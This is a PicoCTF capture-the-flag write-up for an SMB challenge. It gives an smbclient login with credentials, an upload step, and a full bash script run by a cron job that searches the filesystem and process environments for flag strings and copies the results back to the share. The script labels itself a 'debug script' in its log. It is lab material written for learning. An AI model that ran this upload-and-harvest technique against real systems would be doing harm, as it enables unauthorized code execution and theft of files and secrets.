

# SMB Exploitation - PicoCTF Flag Hunt

##Key Points

· The script automatically executes via cron job after being uploaded
· It searches the entire filesystem for files containing flag patterns
· Results are copied back to the SMB share for retrieval
· Multiple flag locations and memory artifacts are examined
· All findings are consolidated into FOUND_FLAGS.txt and individual files


## Attack Steps

1. **Connect to SMB share:**
   
   smbclient //dolphin-cove.picoctf.net/shares -p 57040 -U "JOY%default"

2. smb> put evil.sh script.sh

 cat flag.txt

3. USE THE FOLLOW SCRIPT


```bash
#!/bin/bash

# Aggressive flag hunter - finds everything

# Create output directory in /tmp
OUTPUT_DIR="/tmp/flag_hunt_$$"
mkdir -p $OUTPUT_DIR

LOG="$OUTPUT_DIR/hunt.log"
echo "Starting flag hunt at $(date)" > $LOG

echo "Searching for flag files..." >> $LOG
find / -type f \( -name "*flag*" -o -name "*.txt" -o -name "*.log" \) 2>/dev/null | while read file; do
    # Check if file contains flag pattern
    if grep -l "picoCTF\|flag\|FLAG" "$file" 2>/dev/null; then
        echo "FOUND: $file" >> $LOG
        cp "$file" $OUTPUT_DIR/ 2>/dev/null
    fi
done

# Check common flag locations
COMMON_LOCS=(
    "/flag.txt"
    "/root/flag.txt"
    "/home/*/flag.txt"
    "/tmp/flag.txt"
    "/var/www/flag.txt"
    "/opt/flag.txt"
    "/challenge/flag.txt"
    "/challenge/shares/flag.txt"
    "/root/root.txt"
    "/home/*/user.txt"
)

for loc in "${COMMON_LOCS[@]}"; do
    for file in $loc; do
        if [ -f "$file" ]; then
            echo "COMMON LOC: $file" >> $LOG
            cp "$file" $OUTPUT_DIR/ 2>/dev/null
            cat "$file" >> $OUTPUT_DIR/all_flags.txt 2>/dev/null
        fi
    done
done

ps aux | grep -i flag >> $OUTPUT_DIR/processes.txt 2>/dev/null

env | grep -i flag >> $OUTPUT_DIR/env.txt 2>/dev/null
set | grep -i flag >> $OUTPUT_DIR/set.txt 2>/dev/null

# Check memory (if /proc accessible)
if [ -d "/proc" ]; then
    for pid in $(ls /proc | grep -E '^[0-9]+$' 2>/dev/null); do
        strings /proc/$pid/environ 2>/dev/null | grep -i flag >> $OUTPUT_DIR/proc_env.txt
        strings /proc/$pid/cmdline 2>/dev/null | grep -i flag >> $OUTPUT_DIR/proc_cmd.txt
    done
fi

# Copy results to SMB share (current directory)
if [ -d "$OUTPUT_DIR" ]; then
    cp -r $OUTPUT_DIR/* ./ 2>/dev/null
    
    echo "=== FLAG HUNT RESULTS ===" > ./FOUND_FLAGS.txt
    echo "Date: $(date)" >> ./FOUND_FLAGS.txt
    echo "" >> ./FOUND_FLAGS.txt
    
    # Add all found content
    for f in $OUTPUT_DIR/*; do
        if [ -f "$f" ]; then
            echo "--- $(basename $f) ---" >> ./FOUND_FLAGS.txt
            cat "$f" >> ./FOUND_FLAGS.txt
            echo "" >> ./FOUND_FLAGS.txt
        fi
    done
    
    cat $LOG >> ./cron.log 2>/dev/null
fi

rm -rf $OUTPUT_DIR

echo "$(date) - Debug script completed" >> cron.log

chmod +x evil.sh
```
